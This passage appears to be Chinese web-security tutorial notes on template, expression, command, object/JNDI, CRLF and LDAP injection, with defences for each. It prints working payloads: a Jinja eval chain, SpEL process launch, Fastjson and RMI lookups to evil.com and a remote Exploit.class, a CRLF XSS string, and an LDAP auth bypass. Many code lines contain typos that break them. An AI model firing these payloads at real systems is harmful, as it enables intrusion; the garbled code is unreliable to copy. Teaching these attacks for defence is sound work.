Twig模板引擎将输出"Hello 49"，输入参数中的内容被当作代码执行了。
大部分的模板引擎的用法类似，都可能存在服务端模板注入。例如，Python中的Jinja模板引擎：
```
@app.route("/")
def index():
    name = request.args.get('name','guest')
    t = Tempalte("Hello"+name)
retrun t.render()
```
当name参数为{{7*7}}时，同样可以输出计算后的值。除了做简单的计算，模板引擎还支持更复杂的代码。虽然很多模板引擎设置了一定的安全措施，比如只允许使用特定的函数，或者导入特定的模块，但是很多的模板引擎中，这些措施都可以被绕过。比如上面的Jinja(Python)，可以提交如下name参数值，通过已导入的模块寻找eval()函数，从而执行动态代码：
```
{%for c in [].__class__.__base__.__subclasses__()%}
{%if c.__name__=='catch_warnings'%}
    {%for b in c.__init__.__globals__.values()%}
    {%if b.__class__=={}.__class__%}
        {%if 'eval' in b.keys()%}
            {{b['eval']('__import__("os").popen("id").read()')}}
        {%endif%}
    {%endif%}
    {%endfor%}
{%endif%}
{%endfor%}
```
表达式语言(Expression Language)主要用于 JavaWeb应用，将表达式嵌入在网页中，以便访问JavaBean中的数据，或者获取请求、Cookie、Session等上下文信息。下面是一个简单的表达式用法：
`<c:out value="person.address.street"/>`
表达式引擎在执行时，将调用person对象 getAddress()方法获取address属性，然后再对 address调用getStreet()方法获取street属性。上面的表达式与如下代码是等价的，可以看到，表达式的使用极大的简化了代码：
`<%=HTMLEncoder.encode(((Person)person).getAddress().geetStreet())%>`
表达式很像模板，也是经过引擎解析来执行的，如果web应用接受外部的输入作为表达式或生成表达式，就有代码注入的风险。下面的代码将接受外部变量，用于Spring表达式：
```
@RequestMapping("/test")
@ResponseBody
public String test(String input){
    Uesr user = new User("LaoWang",60);
    SpelExpressionParser parser = new SpelExpresstionParser();
    EvaluationoContext context =new StandardEvaluationContext(user);
    return parser.parseExpression(input).getValue(context).toString();
}
```
如果外部输入变量的值是name，解析表达式时调用user对象的getName()方法获取数据，如果是用户提交的是一个数学表达式，其也能执行并返回计算的值：
`curl 'http:demo.com/test?input=12*12'`
实际上可以执行任意Java代码。如果攻击者提交的input值为如下内容，就可以在web服务器上启动进程：
`new java.lang.ProcessBuilder("/System/Applications/Calculator.app/Contents/Macos/Calculator").start()`
上面的案例演示的是SpEL(Spring Expression Language)注入。此外，还有MVEL、OGNL等常用表达式，使用方法会有差异，使用不当都可能产生代码注入。除了实现代码注入，通过构造特定的变量名，还可以获取服务端应用内部的变量，如密钥等信息，从而导致敏感数据泄露。
模板注入都是由于应用将用户可控的数据当作模板或者表达式来解析而造成的。
#### 命令注入
如果web应用中有执行系统命令的功能，通常是因为需要借助外部程序来完成工作。如果命令的参数受用户输入参数控制，就有可能存在操作系统命令注入(OS Command Injection)风险。例如：下面的代码判断一个IP地址是否网络可达：
```
$ip = $_GET['ip'];
$result = system("ping -c 1 $ip");
```
如果用户提交如下参数：
`ping.php?ip=8.8.8.8;ls`
服务端就会额外执行ls命令，攻击者通过该方式就能执行任意系统命令。即使包含在引号中也容易被绕过。
除了";"，"&"，"&&"，"|"，"||"，换行符等字符 也可以实现多条命令执行。类UNIX系统还支持用\`commnad`和$(command)等方式执行命令，如果其中包含了"<"">"字符，会导致输入输出重定向。可以用来覆盖文件。
在Ruby中，open函数除了可用于打开文件和URL，还可用于创建进程，这取决于文件名第一个字符是否为"|"。下面代码将输出当前日期：
```
cmd = opne("|date")
print cmd.gets
cmd.close
```
所以在Ruby on Rails应用中，使用open函数时，如果文件名或URL由外部输入参数控制，就要注意校验文件名和URL的合法性。
防御手段主要有以下方式：
+ 尽量在应用中实现相应的功能，避免调用外部命令
+ 对参数内容进行严格过滤再进行外部命令调用，在PHP中使用escapeshellarg函数来转义参数，进行白名单参数校验
+ 使用更安全的方法执行外部命令，python中os.system()只支持一个字符串作为命令行参数，可使用更安全的subprocess库用数组的方式指定参数
#### 对象注入
在一些应用场景中，我们需要传输一个对象，这时候可以使用序列化的方式，将对象转换成字节序列，接收方再通过反序列化将对象还原成对象。如果应用程序对用户提供的不可信数据进行了反序列化操作，可能会带来非预期的对象，实现额外的功能。这种在应用程序中产生了非预期对象的注入叫对象注入(Object Injection)。反序列化是最常见的一种注入对象的方式，在部分动态加载对象的场景中也可能产生对象注入。
PHP使用serialize()和unserialize()函数分别实现序列化和反序列化 。如以下代码接收外部数据执行反序列化操作：
```
class Example{
    private $hook;
    function __construct(){
        //some PHP code
    }
    function __wakeup(){
        if(isset($this->hook)) eval($this->hook);
    }
}
$user_data = unserialize($_COOKIE[data]);
```
Example类中的__wakeup()方法会在反序列化之后自动执行。当攻击者条如下代码的反序列化值的URL编码后的数据时，将导致代码执行：
```
class Example{
    private $hook = "phpinfo();";
}
print urlencode(serialilze(new Example));
```
在Java Web应用中，反序列化漏洞更加常见，实现了java.io.Serializable接口的类的对象都可以序列化，其反序列化漏洞与上述PHP反序列化的原理类似。
在Java应用中，JNDI注入最近非常热门。JNDI(Java Naming and  Directory Interface)是sun公司提供的一种标准的Java命令系统接口，它提供一个目录系统，将服务名称与对象关联起来，使得开发人员在开发过程中可以使用服务名称来访问对象。比如访问DNS服务、LDAP服务、RMI等，都可以通过JNDI API进行统一处理。
JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI API来访问和调用。JNDI API在初始化时，可以将一个RMI URL作为参数传入，如：
```
Context context = new InitialContext();
context.lookup(url);
```
如果这里lookup()名称由攻击者控制，攻击者就可以将这个地址指向恶意的RMI/LDAP/CORBA服务器，并响应任意对象。如果此对象是javax.naming.Refernce类(JNDI的一部分，用于表示对命名和目录服务中的对象的应用)的实例，JNDI客户端(即被攻击的应用)将尝试解析此对象的classFactory和classFactoryLocation属性。如果当前应用中classFactory类未定义，应用将通过URLClassLoader从classFactoryLocation指定的位置获取classFactory的字节码，然后调用其getObjectInstance方法。通过这种方式，攻击者就能让目标Java应用执行任意代码。
假设攻击者传入如下URL：
`?url=rmi://10.100.1.152/Object`
然后这个RMI服务，将/Object路径绑定到一个Reference对象上，而这个Reference对象的classFactory来自一个字节码文件http://10.100.1.152:8000/Exploit.class，其中包含了需要执行的恶意代码，攻击者提前编译好class文件放在http服务上即可。
```
Registry registry = LocateRegistry.createRegistry(1099);
Reference reference = new Reference("Exploit","Exploit","http://10.100.1.152:8000/");
ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
registry.bind("Object",referenceWrapper);
```
通过这种方式，攻击者可以让目标应用加载任意Java类，这种攻击方式的利用条件是lookup()的参数由外部输入控制。此处示例是直接传入外部URL来调用lookup() ，一些常见的库也会间接在内部调用lookup()方法，如果能控制其参数，也能发起攻击。
攻击者常用的一个类是`com.sun.rowset.JdbcrowSetImpl`，它dataSource属性支持使用JNDI命名服务，底层会调用lookup()根据dataSourceName属性获取DataSource对象，所以构造dataSourceName的值可能产生JNDI注入：
```
InitialContext varl = new InitialContext();
//JNDI注入
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceNamme());
```
在Java中，很多第三方库也支持序列化和反序列化，如大家熟知的Fastjson，可以讲Java对象序列化为JSON字符串，通过AutoType特性将对象的类型用一个字段"@type"记录记录下来，在反序列化时根据这个字段还原成相应类型的对象。根据这个特性，攻击者构造一个JSON字符串，通过指定"@type"字段为一个危险的类，就可以注入危险对象，实现远程代码执行。
虽然Fastjson加入了黑名单类过滤功能，但是在低于或等于1.2.47的版本中，攻击者发现了绕过黑名单检测的方法，使用受漏洞影响的Fastjson版本解析如下JSON数据就能加载恶意的类：
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}
```
Apache Shiro也是常用的Java库，它有一个记住密码的功能(RememberMe)，实际上是将会话信息序列化后再加密，然后存储在客户端Cookie中。攻击者在没有密钥的情况下无法篡改序列化后的数据，但是如果开发者没有修改Shiro的默认密码，攻击者就能实现恶意操作。
**对象注入防御**
+ 在PHP中，简单场景下，不直接传输序列化对象，而是传输更原子化的数据类型，如JSON数据。
+ 使用类黑/白名单，Java中的反序列化会调用resolveClass读取反序列化类名，通过重写resolveClass方法可以实现黑/白名单校验。Java9支持序列化数据过滤的新特性，也可以实现类黑/白名单
+ 如果需要将序列化之后的数据存储到应用之外，需要对序列化之后的数据签名(如HMAC)，在反序列化之前校验签名的合法性。
+ 在Java应用中，如果有外部输入变量直接或间接作为InitialContext.lookup()的参数，应当严格校验参数的合法性，避免JNDI注入。
+ 从JDK6u141、7u131、8u121版本开始，`com.sun.jndi.rmi.object.trustURLCodebasse`的值默认为false，RMI加载远程的字节码不会执行成功。从JDK的6u201、7u191、8u182、11.01版本开始，`com.sun.jndi.ldap.object.trustURLCodebase`的值默认为false，LDAP远程加载字节码不会成功。高版本的JDK可以缓解JNDI注入。特殊场景下，可利用本地类作为Reference Factory 
#### JNDI
JNDI，就是将Java对象以某个名称的形式绑定(binding)到一个容器环境(Context)，以后调用容器环境到JDNI的容器环境的查找lookup方法又可以查找出名称绑定的容器对象。
JNDI绑定mysql
```
//获取数据库连接池的应用
Context initCtx = new InitialContext();
Context ecCtx = (Context)iniCtx.lookup("java:com/env");
DataSource dataSource = (DataSource)enCtx.lookup("jdbc/myDB");
//使用数据库连接池获取数据库数据
Connection conn = dataSource.getConnection();
//使用数据库进行操作
...
//关闭数据库连接
conn.close();
```
JNDI绑定RMI服务
```
// 获取RMI服务的引用
Context initCtx = new InitialContext();
Context ecCtx = (Context)iniCtx.lookup("java:com/env");
MyRmiService rmiService = (MyRmiService) envCtx.lookup("rmi/myService");
// 调用RMI服务的方法
rmiService.doSomething();
```
JDNI绑定LDAP服务
```
// 获取LDAP服务的引用
Context initCtx = new InitialContext();
Context envCtx = (Context) initCtx.lookup("java:comp/env");
DirContext ldapContext = (DirContext) envCtx.lookup("ldap/myLDAP");
// 使用LDAP服务进行操作，如查询
SearchControls searchControls = new SearchControls();
searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);
NamingEnumeration<SearchResult> results = ldapContext.search("ou=users,dc=example,dc=com", "(objectClass=person)", searchControls);
while (results.hasMore()) {
    SearchResult result = results.next();
    // 处理查询结果
}
// 关闭LDAP连接
ldapContext.close();
```
第一次调用lookup方法是为了获取初始上下文，而第二次调用lookup方法是为了在初始上下文中查找具体的资源。
#### RMI
RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。
### CRLF注入
CRLF是指回车(Carriage Return)和换行(Line Feed)，分别对应"\r"和"\n"字符，其十六进制编码分别为`0x0d`和`0x0a`。在使用了回车饿换行符的语境中，如果用于生成该内容的数据本身就包含回车和换行符，就会导致注入新的语句，这种注入叫做CRLF注入。因为很多HTTP消息头使用了CRLF作为分隔符，所以有些文章会把CRLF注入也叫做消息头注入，其中最典型的就是HTTP和SMTP消息头。
在HTTP协议中，HTTP头是通过"\r\n"来分隔的。因此，如果服务端没有过滤"\r\n "，而又把用户输入的数据放在HTTP头中，则有可能导致安全隐患。这种在HTTP头中的CRLF注入，又称为"Http Response Splitting"。
例如，应用程序将用户提交的参数name输出在Cookie中，但是没有对数据做安全处理，则可能产生XSS攻击。比如，在正常情况下：
`Set-Cookie:username=LaoWang`
**当用户输入的name参数包含两个"\r\n"时，就可以结束HTTP消息头，使后面的内容被当作HTTP响应内容**，例如:
`name=LaoWang%0d%0a%0d%0a<script>alert(document.cookie)</script>`
此时服务端响应的部分内容如下，就实现了XSS攻击：
`Set-Cookie:username=LaoWang`
`<script>alert(document.cookie)</script>`
根据攻击者的需要，这里可以注入任意HTTP头，比如：注入Location头改变跳转地址，让受害者跳转到恶意网站；或者通过添加CSP头来关闭某些安全策略，实现特定的攻击目的。
HTTP/2不再使用文本形式来表示HTTP请求，因此HTTP头的键和值都可以包含回车和换行，而不会影响HTTP语义。该特性一定程度上避免了消息头注入。另一个角度上看，攻击者使用HTTP/2可以往HTTP请求头的键或值中插入回车和换行符，会被传递到后端进一步处理如果处理不当会引发其他安全问题。
SMTP协议头也使用换行符作为分隔符。在如下的发送邮件功能中：
```
<?php
$name = $_POST['name'];
$to = 'nobody@example.com';
$subject = 'the subject';
$message = 'hell0';
$headers = "From:$name\r\n".
    'Reply-To:webmaster@example.com';
mail($to,$subject,$message,$headers);
?>
```
如果用户提交的name参数包含换行符，并插入了新的SMTP头：
`name=LaoWang%0d%0aBcc:someone@evil.site`
攻击者将注入一个新的Bcc头，将邮件发送给其他收件人。
日志文件通常也是用CRLF作为日志分隔符的，如果未对这两个字符进行处理，则可能插入额外的日志记录，影响后续的日志分析。
**防御**
对cookie中的数据需要做URL编码，回车和换行符也会被编码；
其他场景中，需要处理好"\r""\n"这两个保留字符，尤其是使用"换行符"作为分隔符的应用。
很多库已经处理好了该问题，PHP中设置头的header()函数，它会自动转义CRLF。
### LDAP注入
LDAP(Lightweight Directory Access Protocol)全称轻量级目录访问协议，主要用于目录资源的查询。LDAP注入与SQL注入类似，不过LDAP有自己的查询语法。下面的查询使用用户名和密码作为过滤条件，它将查找符合条件的LDAP节点：
`find("(&(cn="+username +")(userPassword=" +pass +"))")`
此时，如果username和pass的值是由用户输入的(比如从表单提交的)且没有做安全过滤，那么攻击者可以构造username和pass的值为"*"，这样将命中所有LDAP用户。
如果恶意用户提交如下的username：
`*)(cn=*))(|(cn=*`
拼接后的查询条件为：
`find("(&(cn=*))(|(cn=*)(userPassword=" + pass +))")`
其中包含了恒真条件，如果用于身份认证，攻击者就能轻易绕过认证。
防御LDAP注入需要对特殊字符进行转义。按照RFC 2245的要求，需要转义如下几个字符：
```
Character     ASCII value
-----------    ----------
        *    0x2a
        (    0x28
        )    0x29
        \    0x5c
        NUL  0x00

```
这5个字符必须使用ASCII码的十六进制表示，然后用反斜杠"\"转义，例如"*"被转义成"\2a"。